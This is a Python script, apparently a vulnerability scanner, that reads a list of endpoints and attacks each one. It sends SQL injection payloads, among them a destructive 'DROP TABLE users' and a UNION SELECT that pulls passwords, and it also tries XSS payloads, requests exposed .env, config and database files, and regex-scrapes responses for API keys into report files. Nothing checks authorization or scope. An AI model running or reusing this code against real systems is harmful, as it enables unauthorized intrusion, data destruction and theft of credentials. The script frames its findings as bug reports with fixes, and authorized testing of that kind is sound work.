import requests
import logging
import re
from datetime import datetime

# Set up logging
logging.basicConfig(filename='vulnerability_escalation.log', level=logging.INFO)

def log_step(step_description):
    logging.info(f"{datetime.now()} - {step_description}")

def load_endpoints(file_path):
    log_step(f"Loading endpoints from file: {file_path}")
    with open(file_path, 'r') as file:
        endpoints = file.readlines()
    log_step(f"Loaded {len(endpoints)} endpoints")
    return endpoints

def attempt_sql_injection(endpoint, param):
    payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
    for payload in payloads:
        params = {param: payload} if param else {}
        response = requests.get(endpoint, params=params)
        log_step(f"SQL Injection Attempt at {endpoint} with payload '{payload}': Status Code {response.status_code}")
        if response.status_code == 200:
            with open('vulnerability_reports/sql_injection.txt', 'a') as report_file:
                report_file.write(f"Bug Type: SQL Injection\nBug Location: {endpoint}\nDescription: SQL Injection attempt with payload '{payload}'\nHow to Replicate: Send payload '{payload}' to parameter '{param}' at {endpoint}\nSolution: Use parameterized queries and proper escaping.\n\n")

def attempt_xss(endpoint, param):
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
    for payload in payloads:
        params = {param: payload} if param else {}
        response = requests.get(endpoint, params=params)
        log_step(f"XSS Attempt at {endpoint} with payload '{payload}': Status Code {response.status_code}")
        if payload in response.text:
            with open('vulnerability_reports/xss.txt', 'a') as report_file:
                report_file.write(f"Bug Type: XSS\nBug Location: {endpoint}\nDescription: XSS attempt with payload '{payload}'\nHow to Replicate: Send payload '{payload}' to parameter '{param}' at {endpoint}\nSolution: Use proper escaping and Content Security Policy (CSP).\n\n")

def check_document_access(endpoint):
    common_files = ['config.yaml', 'config.json', 'database.sql', '.env']
    for file in common_files:
        response = requests.get(f"{endpoint}/{file}")
        if response.status_code == 200:
            with open('vulnerability_reports/document_access.txt', 'a') as report_file:
                report_file.write(f"Bug Type: Document Access\nBug Location: {endpoint}/{file}\nDescription: Access to sensitive document '{file}'\nHow to Replicate: Access {endpoint}/{file} directly\nSolution: Restrict access and use proper authentication.\n\n")

def check_user_data_access(endpoint, param):
    payloads = ["' OR '1'='1", "' UNION SELECT user_data, password FROM users; --"]
    for payload in payloads:
        params = {param: payload} if param else {}
        response = requests.get(endpoint, params=params)
        if "user_data" in response.text:
            with open('vulnerability_reports/user_data_access.txt', 'a') as report_file:
                report_file.write(f"Bug Type: User Data Access\nBug Location: {endpoint}\nDescription: User data access vulnerability with payload '{payload}'\nHow to Replicate: Send payload '{payload}' to parameter '{param}' at {endpoint}\nSolution: Use parameterized queries and proper escaping.\n\n")

def discover_api_keys(endpoint):
    response = requests.get(endpoint)
    api_key_patterns = [
        r'[A-Za-z0-9]{32}',  # Example pattern, modify as needed
        r'[A-Za-z0-9]{40}',  # Another example pattern
    ]
    for pattern in api_key_patterns:
        matches = re.findall(pattern, response.text)
        for match in matches:
            with open('vulnerability_reports/api_keys.txt', 'a') as report_file:
                report_file.write(f"API Key Found at {endpoint}: {match}\n")

def escalate_endpoints(file_path, check_docs, check_user_data):
    endpoints = load_endpoints(file_path)
    if not endpoints:
        print(f"No endpoints loaded from {file_path}")
        return

    for endpoint in endpoints:
        endpoint_data = endpoint.strip().split(',')
        if len(endpoint_data) < 1:
            log_step(f"Skipping malformed line: {endpoint.strip()}")
            continue
        
        url = endpoint_data[0]
        param = endpoint_data[1] if len(endpoint_data) > 1 else None
        
        log_step(f"Escalating endpoint at {url} with parameter {param}")
        
        attempt_sql_injection(url, param)
        attempt_xss(url, param)
        if check_docs:
            check_document_access(url)
        if check_user_data and param:
            check_user_data_access(url, param)
        discover_api_keys(url)
   
    # Save the report
    output_location = 'vulnerability_reports'
    try:
        with open(f"{output_location}/vulnerability_escalation_report.log", 'w') as report_file:
            with open('vulnerability_escalation.log', 'r') as log_file:
                report_file.write(log_file.read())
        print(f"Report saved to {output_location}/vulnerability_escalation_report.log")
    except Exception as e:
        log_step(f"Failed to save report: {e}")
        print(f"Error saving report: {e}")

def run_ve(file_path, check_docs, check_user_data):
    escalate_endpoints(file_path, check_docs, check_user_data)

if __name__ == '__main__':
    # This part is only for standalone testing
    file_path = input("Please enter the file path for detected vulnerabilities: ")
    check_docs = input("Check for document access? (yes/no): ").lower() == 'yes'
    check_user_data = input("Check for user data access? (yes/no): ").lower() == 'yes'
    run_ve(file_path, check_docs, check_user_data)
